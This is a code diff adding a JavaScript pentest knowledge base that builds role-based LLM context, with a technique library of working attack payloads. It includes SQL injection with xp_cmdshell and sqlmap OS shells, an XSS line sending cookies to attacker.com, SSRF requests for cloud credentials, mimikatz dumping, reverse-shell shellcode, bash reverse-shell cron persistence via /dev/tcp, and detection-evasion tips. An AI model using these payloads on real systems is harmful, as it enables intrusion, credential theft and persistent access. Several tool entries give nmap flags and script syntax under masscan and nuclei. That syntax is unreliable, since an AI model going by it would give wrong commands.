@@ -1,0 +1,1005 @@
+import {
+  __esm
+} from "./chunk-KFQGP6VL.js";
+
+// server/lib/pentest-knowledge-base.ts
+function getKnowledgeForRole(role) {
+  switch (role) {
+    case "operator":
+      return {
+        techniques: TECHNIQUE_LIBRARY,
+        tools: TOOL_LIBRARY,
+        webVulns: WEB_VULN_KNOWLEDGE,
+        contextSummary: `You have access to ${TECHNIQUE_LIBRARY.length} offensive techniques spanning ${new Set(TECHNIQUE_LIBRARY.map((t) => t.phase)).size} attack phases, ${TOOL_LIBRARY.length} tool references, and ${WEB_VULN_KNOWLEDGE.length} web vulnerability classes. You can provide specific payloads, enumeration steps, defense bypass techniques, and exploit development guidance at professional penetration testing level.`
+      };
+    case "analyst":
+      return {
+        techniques: TECHNIQUE_LIBRARY,
+        tools: TOOL_LIBRARY.filter((t) => ["scanforge-discovery", "burp_suite", "bloodhound", "zap"].includes(t.name)),
+        webVulns: WEB_VULN_KNOWLEDGE,
+        contextSummary: `You have access to ${TECHNIQUE_LIBRARY.length} attack techniques with their detection indicators and defense bypass methods. Use this to identify threats, correlate findings across sources, and assess the sophistication of observed attacks. Focus on indicators, TTPs, and MITRE ATT&CK mapping.`
+      };
+    case "team_lead":
+      return {
+        techniques: TECHNIQUE_LIBRARY.filter((t) => ["recon", "enumeration", "initial_access", "reporting"].includes(t.phase)),
+        tools: TOOL_LIBRARY,
+        webVulns: WEB_VULN_KNOWLEDGE,
+        contextSummary: `You have access to methodology knowledge for planning engagements, assigning tasks, and reviewing operator work. Focus on engagement phases, tool selection, and quality assurance of findings.`
+      };
+    case "executive":
+      return {
+        techniques: [],
+        tools: [],
+        webVulns: WEB_VULN_KNOWLEDGE.map((v) => ({
+          ...v,
+          commonPayloads: [],
+          // Strip payloads for executive context
+          testingMethodology: []
+        })),
+        contextSummary: `You have access to ${WEB_VULN_KNOWLEDGE.length} vulnerability categories with business impact descriptions and remediation guidance. Translate technical findings into business risk, financial impact, and strategic recommendations.`
+      };
+    case "client":
+      return {
+        techniques: [],
+        tools: [],
+        webVulns: WEB_VULN_KNOWLEDGE,
+        contextSummary: `You have access to ${WEB_VULN_KNOWLEDGE.length} vulnerability categories with remediation guidance. Help clients understand findings, prioritize fixes, and implement security improvements.`
+      };
+    case "admin":
+      return {
+        techniques: TECHNIQUE_LIBRARY.filter((t) => t.phase === "recon" || t.phase === "enumeration"),
+        tools: TOOL_LIBRARY.filter((t) => ["scanforge-discovery", "nuclei", "zap"].includes(t.name)),
+        webVulns: [],
+        contextSummary: `You have access to reconnaissance and scanning tool references for platform administration. Focus on infrastructure health, scan configuration, and system optimization.`
+      };
+    default:
+      return {
+        techniques: [],
+        tools: [],
+        webVulns: [],
+        contextSummary: "General security knowledge available."
+      };
+  }
+}
+function buildKnowledgeContextForLLM(role, maxTokenEstimate = 4e3) {
+  const knowledge = getKnowledgeForRole(role);
+  const sections = [];
+  sections.push(`## Pentest Knowledge Base
+${knowledge.contextSummary}`);
+  if (knowledge.techniques.length > 0) {
+    const techSummary = knowledge.techniques.map(
+      (t) => `**${t.name}** [${t.phase}] \u2014 ${t.description.substring(0, 120)}... Tools: ${t.tools.join(", ")}. MITRE: ${t.mitreTechniqueId}.`
+    ).join("\n");
+    sections.push(`### Available Techniques (${knowledge.techniques.length})
+${techSummary}`);
+  }
+  if (knowledge.tools.length > 0) {
+    const toolSummary = knowledge.tools.map(
+      (t) => `**${t.displayName}** (${t.category}): ${t.quickReference.slice(0, 3).join(" | ")}`
+    ).join("\n");
+    sections.push(`### Tool Quick Reference
+${toolSummary}`);
+  }
+  if (knowledge.webVulns.length > 0) {
+    const vulnSummary = knowledge.webVulns.map(
+      (v) => `**${v.name}** [${v.owaspCategory}]: ${v.description.substring(0, 100)}... Remediation: ${v.remediationGuidance.substring(0, 100)}...`
+    ).join("\n");
+    sections.push(`### Web Vulnerability Knowledge
+${vulnSummary}`);
+  }
+  let result = sections.join("\n\n");
+  const estimatedTokens = result.length / 4;
+  if (estimatedTokens > maxTokenEstimate) {
+    result = result.substring(0, maxTokenEstimate * 4) + "\n\n[Knowledge base truncated for context window]";
+  }
+  return result;
+}
+function searchTechniques(query) {
+  const q = query.toLowerCase();
+  return TECHNIQUE_LIBRARY.filter(
+    (t) => t.name.toLowerCase().includes(q) || t.description.toLowerCase().includes(q) || t.pentestTags.some((tag) => tag.includes(q)) || t.exploitDevTags.some((tag) => tag.includes(q)) || t.mitreTechniqueId.toLowerCase().includes(q) || t.tools.some((tool) => tool.includes(q))
+  );
+}
+function searchTools(query) {
+  const q = query.toLowerCase();
+  return TOOL_LIBRARY.filter(
+    (t) => t.name.includes(q) || t.displayName.toLowerCase().includes(q) || t.category.toLowerCase().includes(q)
+  );
+}
+var TECHNIQUE_LIBRARY, TOOL_LIBRARY, WEB_VULN_KNOWLEDGE;
+var init_pentest_knowledge_base = __esm({
+  "server/lib/pentest-knowledge-base.ts"() {
+    TECHNIQUE_LIBRARY = [
+      // ── RECON ──
+      {
+        id: "TECH-RECON-001",
+        name: "Network Discovery with ScanForge Discovery",
+        phase: "recon",
+        pentestTags: ["scanforge-discovery"],
+        exploitDevTags: [],
+        mitreTechniqueId: "T1046",
+        description: "Systematic network scanning to identify live hosts, open ports, running services, and OS fingerprints. Foundation of every engagement.",
+        tools: ["scanforge-discovery"],
+        commonPayloads: [
+          "masscan -pC -sV -oA initial <target>",
+          "naabu -p- --min-rate 10000 -oA allports <target>",
+          "masscan -pU --top-ports 200 -oA udp <target>",
+          "nuclei -t vuln -p <ports> <target>",
+          "masscan -pV --version-intensity 5 -p <ports> <target>",
+          "masscan -p445 <target> --rate 1000 && nuclei -t cves/smb/ -target <target>"
+        ],
+        enumSteps: [
+          "1. Host discovery: masscan -pn <subnet> to find live hosts",
+          "2. Port scan: Full TCP (-p-) and top UDP ports",
+          "3. Service version detection: -sV on discovered ports",
+          "4. OS fingerprinting: -O flag with sufficient open/closed ports",
+          "5. Nuclei templates: --script=default,vuln for automated checks",
+          "6. Output: Always save to all formats (-oA) for reporting"
+        ],
+        indicators: [
+          "Unusual open ports (e.g., 8080, 8443, 9090)",
+          "Outdated service versions",
+          "Default banners or configurations",
+          "Services running as root/SYSTEM"
+        ],
+        defenseBypass: [
+          "Use -T2 or -T1 for slower, stealthier scans",
+          "Fragment packets with -f flag",
+          "Use decoy scans: -D RND:10",
+          "Source port manipulation: --source-port 53"
+        ],
+        reportingNotes: "Document all discovered hosts, ports, and services. Include version numbers for vulnerability correlation. Note any services that should not be externally accessible."
+      },
+      {
+        id: "TECH-RECON-002",
+        name: "Web Application Enumeration",
+        phase: "enumeration",
+        pentestTags: ["web_enum"],
+        exploitDevTags: [],
+        mitreTechniqueId: "T1595.002",
+        description: "Systematic discovery of web application structure including directories, files, virtual hosts, and technology stack identification.",
+        tools: ["gobuster", "ffuf", "nikto", "burp_suite"],
+        commonPayloads: [
+          "gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt",
+          "ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
+          "ffuf -u http://<target> -H 'Host: FUZZ.<domain>' -w subdomains.txt -fs <default_size>",
+          "nikto -h http://<target> -o nikto.txt",
+          "whatweb http://<target>",
+          "wappalyzer-cli http://<target>"
+        ],
+        enumSteps: [
+          "1. Technology fingerprint: whatweb, Wappalyzer to identify stack",
+          "2. Directory bruteforce: gobuster/ffuf with multiple wordlists",
+          "3. File extension fuzzing: -x php,asp,aspx,jsp,txt,bak,old",
+          "4. Virtual host enumeration: ffuf with Host header fuzzing",
+          "5. Parameter discovery: Arjun or Burp Param Miner",
+          "6. API endpoint discovery: Check /api/, /v1/, /swagger/, /graphql",
+          "7. Check robots.txt, sitemap.xml, .git exposure, backup files"
+        ],
+        indicators: [
+          "Exposed admin panels (/admin, /manager, /wp-admin)",
+          "Backup files (.bak, .old, .swp, ~)",
+          "Version control exposure (.git, .svn)",
+          "API documentation endpoints",
+          "Default credentials on login pages"
+        ],
+        defenseBypass: [
+          "Rotate User-Agent strings",
+          "Use rate limiting to avoid WAF triggers",
+          "Try different HTTP methods (GET, POST, PUT)",
+          "URL encode or double-encode payloads"
+        ],
+        reportingNotes: "Document all discovered endpoints, technologies, and misconfigurations. Screenshot exposed admin panels. Note any information disclosure."
+      },
+      // ── INITIAL ACCESS ──
+      {
+        id: "TECH-ACCESS-001",
+        name: "SQL Injection",
+        phase: "initial_access",
+        pentestTags: ["sqli"],
+        exploitDevTags: [],
+        mitreTechniqueId: "T1190",
+        description: "Exploit SQL injection vulnerabilities to extract data, bypass authentication, or achieve remote code execution through database interaction.",
+        tools: ["sqlmap", "burp_suite"],
+        commonPayloads: [
+          "' OR 1=1-- -",
+          "' UNION SELECT NULL,NULL,NULL-- -",
+          "' UNION SELECT username,password,NULL FROM users-- -",
+          "'; EXEC xp_cmdshell('whoami')-- -",
+          "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
+          "sqlmap -u 'http://<target>/page?id=1' --batch --dbs",
+          "sqlmap -u 'http://<target>/page?id=1' -D <db> -T users --dump",
+          "sqlmap -u 'http://<target>/page?id=1' --os-shell"
+        ],
+        enumSteps: [
+          `1. Identify injection points: test all parameters with ' and "`,
+          "2. Determine database type from error messages",
+          "3. Test for UNION-based: increment NULL columns until no error",
+          "4. Test for blind: time-based SLEEP() or boolean-based",
+          "5. Extract database names, tables, columns systematically",
+          "6. Dump credentials and check for password reuse",
+          "7. Attempt OS command execution if DB supports it (xp_cmdshell, INTO OUTFILE)"
+        ],
+        indicators: [
+          "Verbose SQL error messages in responses",
+          "Different response lengths for true/false conditions",
+          "Time delays with SLEEP/WAITFOR/pg_sleep",
+          "Stack traces revealing database type"
+        ],
+        defenseBypass: [
+          "Use CHAR() encoding to bypass WAF filters",
+          "Case variation: SeLeCt, UnIoN",
+          "Comment injection: /**/UNION/**/SELECT",
+          "Double URL encoding",
+          "Use alternative syntax: GROUP BY/HAVING for error-based"
+        ],
+        reportingNotes: "Document the injection point, database type, data extracted, and potential for RCE. Classify severity based on data sensitivity and access level achieved."
+      },
+      {
+        id: "TECH-ACCESS-002",
+        name: "Cross-Site Scripting (XSS)",
+        phase: "initial_access",
+        pentestTags: ["xss"],
+        exploitDevTags: [],
+        mitreTechniqueId: "T1189",
+        description: "Inject malicious scripts into web applications to steal credentials, hijack sessions, or deliver payloads to other users.",
+        tools: ["burp_suite", "zap"],
+        commonPayloads: [
+          "<script>alert(document.cookie)</script>",
+          "<img src=x onerror=alert(1)>",
+          "<svg onload=alert(1)>",
+          "javascript:alert(1)",
+          `"><script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`,
+          `<img src=x onerror="eval(atob('BASE64_PAYLOAD'))">`,
+          "{{constructor.constructor('return this')().alert(1)}}"
+        ],
+        enumSteps: [
+          "1. Map all input reflection points (URL params, form fields, headers)",
+          "2. Test basic payloads: <script>alert(1)</script>",
+          "3. Identify context: HTML body, attribute, JavaScript, URL",
+          "4. Test filter bypass: encoding, case variation, alternative tags",
+          "5. Check for DOM-based XSS: review client-side JavaScript",
+          "6. Test stored XSS: submit payloads and check if persisted",
+          "7. Craft weaponized payload: session theft, keylogging, phishing"
+        ],
+        indicators: [
+          "User input reflected in HTML without encoding",
+          "JavaScript context with controllable input",
+          "innerHTML or document.write with user data",
+          "Lack of Content-Security-Policy headers"
+        ],
+        defenseBypass: [
+          "HTML entity encoding bypass: &#x3C;script&#x3E;",
+          "Event handlers: onmouseover, onfocus, onerror",
+          "Protocol handlers: javascript:, data:",
+          "Template injection: {{7*7}} for Angular/Vue",
+          "Mutation XSS via DOM clobbering"
+        ],
+        reportingNotes: "Document the injection type (reflected/stored/DOM), affected parameter, and demonstrate impact with session theft PoC. Note CSP status."
+      },
+      {
+        id: "TECH-ACCESS-003",
+        name: "Server-Side Request Forgery (SSRF)",
+        phase: "initial_access",
+        pentestTags: ["ssrf"],
+        exploitDevTags: [],
+        mitreTechniqueId: "T1190",
+        description: "Exploit server-side URL fetching to access internal services, cloud metadata, or pivot through the server's network position.",
+        tools: ["burp_suite"],
+        commonPayloads: [
+          "http://127.0.0.1:80/admin",
+          "http://169.254.169.254/latest/meta-data/",
+          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "http://[::1]:80/",
+          "http://0x7f000001/",
+          "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
+          "file:///etc/passwd",
+          "dict://127.0.0.1:11211/stats"
+        ],
+        enumSteps: [
+          "1. Identify URL input parameters (url=, path=, src=, redirect=)",
+          "2. Test with external callback (Burp Collaborator, webhook.site)",
+          "3. Test internal addresses: 127.0.0.1, localhost, 0.0.0.0",
+          "4. Test cloud metadata: 169.254.169.254 (AWS/GCP/Azure)",
+          "5. Port scan internal network via SSRF",
+          "6. Test protocol handlers: file://, gopher://, dict://",
+          "7. Attempt to reach internal services (Redis, Elasticsearch, etc.)"
+        ],
+        indicators: [
+          "URL parameters that fetch remote content",
+          "PDF generators, image resizers, webhook endpoints",
+          "Different response times for internal vs external URLs",
+          "Error messages revealing internal network topology"
+        ],
+        defenseBypass: [
+          "DNS rebinding to bypass allowlist checks",
+          "IPv6 notation: [::ffff:127.0.0.1]",
+          "Decimal IP: 2130706433 (127.0.0.1)",
+          "URL encoding and double encoding",
+          "Redirect chains through allowed domains",
+          "DNS pinning bypass with short TTL"
+        ],
+        reportingNotes: "Document the SSRF vector, internal services accessed, and data extracted. Cloud metadata exposure is typically critical severity."
+      },
+      // ── PRIVILEGE ESCALATION ──
+      {
+        id: "TECH-PRIVESC-001",
+        name: "Linux Privilege Escalation",
+        phase: "privilege_escalation",
+        pentestTags: ["privesc_linux"],
+        exploitDevTags: [],
+        mitreTechniqueId: "T1068",
+        description: "Escalate from low-privilege shell to root on Linux systems through misconfigurations, SUID binaries, kernel exploits, or credential reuse.",
+        tools: ["linpeas", "pspy"],
+        commonPayloads: [
+          "sudo -l                          # Check sudo permissions",
+          "find / -perm -4000 2>/dev/null   # Find SUID binaries",
+          "find / -writable -type f 2>/dev/null  # Writable files",
+          "cat /etc/crontab                 # Check cron jobs",
+          "ls -la /etc/shadow               # Check shadow readability",
+          "getcap -r / 2>/dev/null          # Check capabilities",
+          "env | grep -i pass               # Environment variables",
+          "find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null | head -20"
+        ],
+        enumSteps: [
+          "1. Run LinPEAS for automated enumeration",
+          "2. Check sudo -l for NOPASSWD entries",
+          "3. Find SUID/SGID binaries and cross-reference GTFOBins",
+          "4. Check cron jobs for writable scripts or PATH hijacking",
+          "5. Look for credentials in config files, history, env vars",
+          "6. Check for writable /etc/passwd or shadow",
+          "7. Check kernel version for known exploits (uname -a)",
+          "8. Check capabilities (getcap) for binaries with cap_setuid",
+          "9. Check for Docker/LXC escape vectors",
+          "10. Monitor processes with pspy for scheduled tasks"
+        ],
+        indicators: [
+          "SUID binaries not in standard set",
+          "World-writable cron scripts",
+          "Credentials in plaintext config files",
+          "Outdated kernel versions",
+          "Docker socket accessible",
+          "NFS shares with no_root_squash"
+        ],
+        defenseBypass: [
+          "Use GTFOBins for creative SUID exploitation",
+          "PATH hijacking for cron jobs",
+          "Shared library injection via LD_PRELOAD",
+          "Capability abuse (cap_setuid+ep)"
+        ],
+        reportingNotes: "Document the escalation path with exact commands. Note whether the vector is a misconfiguration (fixable) or a kernel vulnerability (requires patching)."
+      },
+      {
+        id: "TECH-PRIVESC-002",
+        name: "Windows Privilege Escalation",
+        phase: "privilege_escalation",
+        pentestTags: ["privesc_windows"],
+        exploitDevTags: ["win32"],
+        mitreTechniqueId: "T1068",
+        description: "Escalate from standard user to SYSTEM/Administrator on Windows through service misconfigurations, token manipulation, or credential harvesting.",
+        tools: ["winpeas", "mimikatz", "rubeus"],
+        commonPayloads: [
+          "whoami /priv                     # Check token privileges",
+          "whoami /groups                   # Check group memberships",
+          "systeminfo                       # OS version and patches",
+          "wmic service get name,pathname,startmode | findstr /i auto",
+          'icacls "C:\\Program Files\\*" /T /C 2>nul | findstr /i "(F) (M) (W)"',
+          "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+          "cmdkey /list                     # Stored credentials",
+          'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
+        ],
+        enumSteps: [
+          "1. Run WinPEAS for automated enumeration",
+          "2. Check whoami /priv for SeImpersonatePrivilege, SeBackupPrivilege",
+          "3. Enumerate services: unquoted paths, weak permissions, writable binaries",
+          "4. Check AlwaysInstallElevated registry key",
+          "5. Look for stored credentials: cmdkey, credential manager",
+          "6. Check scheduled tasks for writable scripts",
+          "7. Enumerate installed software for known vulnerabilities",
+          "8. Check for autologon credentials in registry",
+          "9. If domain-joined: check for Kerberoastable accounts",
+          "10. Check for PrintSpoofer/JuicyPotato if SeImpersonate is set"
+        ],
+        indicators: [
+          "SeImpersonatePrivilege enabled",
+          "Unquoted service paths with spaces",
+          "Services running as SYSTEM with weak ACLs",
+          "AlwaysInstallElevated = 1",
+          "Stored credentials in credential manager",
+          "Missing patches (systeminfo vs exploit-suggester)"
+        ],
+        defenseBypass: [
+          "Use PrintSpoofer/GodPotato for SeImpersonate",
+          "DLL hijacking for service escalation",
+          "Token impersonation with incognito",
+          "UAC bypass techniques"
+        ],
+        reportingNotes: "Document the escalation chain from initial access to SYSTEM. Include the specific misconfiguration and remediation steps."
+      },
+      // ── ACTIVE DIRECTORY ──
+      {
+        id: "TECH-AD-001",
+        name: "Active Directory Enumeration and Attack",
+        phase: "lateral_movement",
+        pentestTags: ["ad_enum", "kerberos"],
+        exploitDevTags: [],
+        mitreTechniqueId: "T1558",
+        description: "Enumerate and attack Active Directory environments through Kerberoasting, AS-REP roasting, delegation abuse, and trust exploitation.",
+        tools: ["bloodhound", "crackmapexec", "impacket", "rubeus", "kerbrute", "certify"],
+        commonPayloads: [
+          "bloodhound-python -d <domain> -u <user> -p <pass> -c all",
+          "crackmapexec smb <target> -u <user> -p <pass> --shares",
+          "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request",
+          "impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc>",
+          "rubeus.exe kerberoast /outfile:hashes.txt",
+          "certify.exe find /vulnerable",
+          "impacket-secretsdump <domain>/<admin>:<pass>@<dc>",
+          "crackmapexec smb <subnet>/24 -u <user> -p <pass> --pass-pol"
+        ],
+        enumSteps: [
+          "1. BloodHound collection: map all users, groups, computers, GPOs",
+          "2. Identify shortest paths to Domain Admin in BloodHound",
+          "3. Enumerate SPNs for Kerberoasting targets",
+          "4. Check for AS-REP roastable accounts (no pre-auth)",
+          "5. Enumerate shares: crackmapexec smb --shares",
+          "6. Check for ADCS misconfigurations: certify find /vulnerable",
+          "7. Enumerate delegation: unconstrained, constrained, RBCD",
+          "8. Check GPP passwords: Get-GPPPassword",
+          "9. Enumerate trusts: nltest /domain_trusts",
+          "10. Check for LAPS: Get-LAPSPasswords"
+        ],
+        indicators: [
+          "Service accounts with weak passwords (Kerberoasting)",
+          "Accounts without Kerberos pre-authentication",
+          "Misconfigured certificate templates (ESC1-ESC8)",
+          "Unconstrained delegation on computers",
+          "GPP passwords in SYSVOL",
+          "AdminCount=1 users with weak passwords"
+        ],
+        defenseBypass: [
+          "Use Kerberos tickets instead of NTLM for lateral movement",
+          "Overpass-the-hash to avoid pass-the-hash detection",
+          "S4U2Self abuse for delegation attacks",
+          "Shadow credentials for persistence"
+        ],
+        reportingNotes: "Map the full attack path from initial foothold to Domain Admin. Include BloodHound screenshots showing the path. Document each step with timestamps."
+      },
+      // ── EXPLOIT DEVELOPMENT (Advanced) ──
+      {
+        id: "TECH-EXPLOITDEV-001",
+        name: "Stack Buffer Overflow",
+        phase: "initial_access",
+        pentestTags: [],
+        exploitDevTags: ["debugging", "win32", "seh", "badchars", "shellcoding"],
+        mitreTechniqueId: "T1203",
+        description: "Develop custom exploits for stack-based buffer overflow vulnerabilities. Core exploit development skill covering crash analysis, offset finding, bad character identification, and shellcode placement.",
+        tools: ["gdb", "ghidra"],
+        commonPayloads: [
+          "# 1. Fuzzing to find crash point",
+          `python3 -c "print('A'*5000)" | nc <target> <port>`,
+          "# 2. Pattern create for offset",
+          "msf-pattern_create -l 5000",
+          "# 3. Pattern offset from EIP value",
+          "msf-pattern_offset -l 5000 -q <EIP_value>",
+          "# 4. Verify offset with 'B' * 4 at EIP",
+          "# 5. Find bad characters (\\x00 always bad)",
+          "# 6. Find JMP ESP address (no bad chars, no ASLR)",
+          "!mona jmp -r esp -cpb '\\x00'",
+          "# 7. Generate shellcode",
+          "msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -b '\\x00' -f python"
+        ],
+        enumSteps: [
+          "1. Fuzz the application to find the crash point",
+          "2. Replicate crash with controlled input",
+          "3. Use pattern_create/pattern_offset to find exact EIP offset",
+          "4. Verify control: place 'BBBB' at EIP, confirm in debugger",
+          "5. Identify bad characters: send \\x01-\\xff, check for truncation/mangling",
+          "6. Find a JMP ESP (or equivalent) gadget in a non-ASLR module",
+          "7. Generate shellcode excluding bad characters",
+          "8. Construct payload: padding + JMP_ESP + NOP sled + shellcode",
+          "9. Test exploit against target",
+          "10. Document the full exploit development process"
+        ],
+        indicators: [
+          "Application crashes with long input (segfault, access violation)",
+          "EIP overwritten with user-controlled data",
+          "No stack canaries or ASLR on target binary",
+          "Writable and executable stack memory"
+        ],
+        defenseBypass: [
+          "SEH overwrite if stack cookies present",
+          "ROP chains to bypass DEP",
+          "Egg hunting for limited buffer space",
+          "Partial EIP overwrite for ASLR bypass"
+        ],
+        reportingNotes: "Document the full exploit development chain: crash discovery, offset calculation, bad character analysis, gadget selection, and shellcode generation. Include debugger screenshots."
+      },
+      {
+        id: "TECH-EXPLOITDEV-002",
+        name: "SEH Overflow and ROP Chains",
+        phase: "initial_access",
+        pentestTags: [],
+        exploitDevTags: ["seh", "rop", "dep_aslr"],
+        mitreTechniqueId: "T1203",
+        description: "Advanced exploit development using Structured Exception Handler (SEH) overwrites and Return-Oriented Programming (ROP) to bypass DEP and ASLR protections.",
+        tools: ["gdb", "ghidra"],
+        commonPayloads: [
+          "# SEH overwrite pattern",
+          "# nSEH: short jump forward (\\xeb\\x06\\x90\\x90)",
+          "# SEH: POP POP RET gadget address",
+          "!mona seh -cpb '\\x00'",
+          "# ROP chain generation",
+          "!mona rop -cpb '\\x00'",
+          "# VirtualProtect ROP chain to mark stack executable",
+          "# Then jump to shellcode on now-executable stack"
+        ],
+        enumSteps: [
+          "1. Trigger exception with overflow to corrupt SEH chain",
+          "2. Find SEH offset using pattern_create",
+          "3. Locate POP POP RET gadget in non-SafeSEH module",
+          "4. Place short JMP in nSEH to jump over SEH to shellcode",
+          "5. For DEP bypass: build ROP chain to call VirtualProtect/VirtualAlloc",
+          "6. Use mona.py to auto-generate ROP chains",
+          "7. Chain: overflow \u2192 SEH \u2192 POP POP RET \u2192 nSEH JMP \u2192 ROP \u2192 shellcode"
+        ],
+        indicators: [
+          "SEH chain corrupted in debugger",
+          "DEP enabled on target process",
+          "SafeSEH not enabled on all modules",
+          "Non-ASLR modules available for gadgets"
+        ],
+        defenseBypass: [
+          "Use non-SafeSEH modules for POP POP RET",
+          "ROP chains using non-ASLR DLLs",
+          "Egg hunter when buffer space is limited",
+          "Stack pivot for constrained overflows"
+        ],
+        reportingNotes: "Document the protection mechanisms present (DEP, ASLR, SafeSEH, stack cookies) and how each was bypassed. Include the ROP chain with gadget addresses."
+      },
+      // ── PASSWORD ATTACKS ──
+      {
+        id: "TECH-PASSWD-001",
+        name: "Password Attacks and Credential Harvesting",
+        phase: "initial_access",
+        pentestTags: ["password_attacks"],
+        exploitDevTags: [],
+        mitreTechniqueId: "T1110",
+        description: "Crack, spray, and harvest credentials through online brute force, offline hash cracking, and credential dumping techniques.",
+        tools: ["john", "hashcat", "hydra", "crackmapexec", "mimikatz", "responder"],
+        commonPayloads: [
+          "# Online brute force",
+          "hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
+          "crackmapexec smb <target> -u users.txt -p 'Password1!' --continue-on-success",
+          "# Offline cracking",
+          "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+          "john --wordlist=rockyou.txt --rules=best64 hashes.txt",
+          "# Credential harvesting",
+          "responder -I eth0 -wrf",
+          'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
+          "impacket-secretsdump <domain>/<admin>:<pass>@<dc>"
+        ],
+        enumSteps: [
+          "1. Enumerate valid usernames (Kerbrute, SMTP VRFY, web app)",
+          "2. Check for default credentials on all services",
+          "3. Password spray with common passwords (Season+Year, Company+123)",
+          "4. Capture hashes with Responder on the network",
+          "5. Crack captured hashes with hashcat/john + rules",
+          "6. Dump credentials from compromised hosts (mimikatz, secretsdump)",
+          "7. Check for credential reuse across services",
+          "8. Extract hashes from SAM/NTDS.dit if available"
+        ],
+        indicators: [
+          "Account lockout policies (or lack thereof)",
+          "NTLM authentication on the network",
+          "Weak password policy",
+          "Credential reuse across services",
+          "Cleartext protocols (FTP, Telnet, HTTP basic)"
+        ],
+        defenseBypass: [
+          "Spray slowly to avoid lockout (1 attempt per 30 min)",
+          "Use Kerberos pre-auth for username enumeration",
+          "NTLM relay instead of cracking",
+          "Pass-the-hash for lateral movement without cracking"
+        ],
+        reportingNotes: "Document cracked passwords (redacted in report), password policy weaknesses, and credential reuse findings. Recommend specific password policy improvements."
+      },
+      // ── PERSISTENCE ──
+      {
+        id: "TECH-PERSIST-001",
+        name: "Persistence Mechanisms",
+        phase: "persistence",
+        pentestTags: [],
+        exploitDevTags: [],
+        mitreTechniqueId: "T1053",
+        description: "Establish persistent access through scheduled tasks, services, registry modifications, or implant deployment for long-term access.",
+        tools: ["sliver", "metasploit"],
+        commonPayloads: [
+          "# Linux persistence",
+          `echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"' | crontab -`,
+          "echo '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1' > /tmp/.hidden.sh && chmod +x /tmp/.hidden.sh",
+          "# Windows persistence",
+          'schtasks /create /tn "WindowsUpdate" /tr "C:\\temp\\payload.exe" /sc onlogon /ru SYSTEM',
+          'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "C:\\temp\\payload.exe"',
+          "# C2 implant deployment",
+          "sliver > generate --mtls <c2_ip> --os windows --arch amd64 --save implant.exe"
+        ],
+        enumSteps: [
+          "1. Assess required persistence duration and stealth level",
+          "2. Choose mechanism based on access level and OS",
+          "3. Deploy persistence with obfuscated naming",
+          "4. Verify persistence survives reboot",
+          "5. Document all persistence mechanisms for cleanup",
+          "6. Set up C2 callback with jitter and domain fronting"
+        ],
+        indicators: [
+          "New scheduled tasks or cron jobs",
+          "Registry Run key modifications",
+          "New services or modified service binaries",
+          "Unusual startup items"
+        ],
+        defenseBypass: [
+          "Use legitimate-looking service names",
+          "Timestomp persistence artifacts",
+          "Use WMI event subscriptions (harder to detect)",
+          "Golden ticket for Kerberos persistence"
+        ],
+        reportingNotes: "Document all persistence mechanisms deployed during the engagement. Provide exact cleanup instructions. Note detection gaps in the client's monitoring."
+      }
+    ];
+    TOOL_LIBRARY = [
+      {
+        name: "scanforge-discovery",
+        displayName: "ScanForge Discovery",
+        category: "Reconnaissance",
+        description: "Network mapper for host discovery, port scanning, service detection, and vulnerability scanning.",
+        installCommand: "apt install masscan naabu",
+        quickReference: [
+          "masscan -pC -sV -oA scan <target>     # Default scripts + version detection",
+          "naabu -p- --min-rate 10000 <target>  # Fast full port scan",
+          "masscan -pU --top-ports 200 <target>   # UDP scan",
+          "nuclei -t vuln <target>         # Vulnerability scripts",
+          "masscan -pn <subnet>/24               # Host discovery only"
+        ],
+        commonFlags: [
+          { flag: "-sC", description: "Run default Nuclei templates" },
+          { flag: "-sV", description: "Service version detection" },
+          { flag: "-sS", description: "SYN stealth scan" },
+          { flag: "-sU", description: "UDP scan" },
+          { flag: "-p-", description: "Scan all 65535 ports" },
+          { flag: "-oA", description: "Output in all formats" },
+          { flag: "-Pn", description: "Skip host discovery" },
+          { flag: "--script", description: "Run specific Nuclei templates" },
+          { flag: "-T4", description: "Aggressive timing" },
+          { flag: "--min-rate", description: "Minimum packet rate" }
+        ],
+        useCases: ["Initial reconnaissance", "Port discovery", "Service enumeration", "Vulnerability scanning", "OS fingerprinting"],
+        outputParsing: "Parse XML output (-oX) for automated processing. Key fields: host/address, ports/port/state, ports/port/service.",
+        cheatSheetUrl: "https://github.com/projectdiscovery/naabu"
+      },
+      {
+        name: "metasploit",
+        displayName: "Metasploit Framework",
+        category: "Exploitation",
+        description: "Comprehensive exploitation framework with 2000+ exploits, payloads, and auxiliary modules.",
+        installCommand: "apt install metasploit-framework",
+        quickReference: [
+          "msfconsole                          # Start console",
+          "search type:exploit <keyword>       # Find exploits",
+          "use exploit/windows/smb/ms17_010    # Select module",
+          "set RHOSTS <target>                 # Set target",
+          "set LHOST <attacker_ip>             # Set callback",
+          "exploit                             # Execute",
+          "sessions -l                         # List sessions",
+          "sessions -i <id>                    # Interact with session"
+        ],
+        commonFlags: [
+          { flag: "search", description: "Search modules by keyword, type, platform" },
+          { flag: "use", description: "Select a module" },
+          { flag: "set/setg", description: "Set module options (setg = global)" },
+          { flag: "run/exploit", description: "Execute the module" },
+          { flag: "background", description: "Background current session" },
+          { flag: "route", description: "Add route through session for pivoting" }
+        ],
